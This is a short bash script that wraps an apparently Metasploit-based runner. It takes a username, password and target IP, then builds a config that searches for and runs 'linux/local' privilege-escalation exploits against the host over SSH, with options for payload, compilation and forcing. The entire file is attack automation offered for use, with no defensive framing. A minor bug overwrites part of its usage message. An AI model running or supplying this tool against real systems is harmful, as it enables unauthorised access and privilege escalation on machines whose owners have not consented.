#!/bin/bash
usage() {
    usagep1="Usage: $0 <username> <password> <ip>"
    usagep2="[port] [-e exclude] [-c --compile]"
    usagep2="[-p payload] [-f --force]"
    echo "$usagep1 $usagep2"
    exit 1
}
[[ "$#" -lt 1 ]] && usage

while [[ "$#" -gt 0 ]];do
    case "$1" in
        "-c" | "--compile") shift; compile="True";;
        "-f" | "--force") shift; force="force";;
        "-p") shift; payload="payload $1"; shift;;
        "-e") shift; excludes+="$1 "; shift;;
        *)
            if [[ ! "$user" ]];then user="$1"
            elif [[ ! "$pass" ]];then pass="$1"
            elif [[ ! "$host" ]];then host="$1"
            elif [[ ! "$port" ]];then port="$1"
            else usage; fi
            shift
            ;;
    esac
done
[[ "$user" ]] || usage
[[ "$pass" ]] || usage
[[ "$host" ]] || usage
[[ "$port" ]] || port=22
[[ "$compile" ]] || compile="False"

bin="$HOME/.local/share/msf/run.sh"
cnf="$(mktemp -d)/msf-linux-exploit"

cat<<EOF > "$cnf.ftcnf"
:opt
use_name .
$force
$payload

:search
type exploit
name linux/local
exclude dos $excludes

:session
RHOSTS $host
RPORT $port
USER $user
PASS $pass

:args
SESSION 1
COMPILE $compile
EOF
$bin "$cnf.ftcnf"
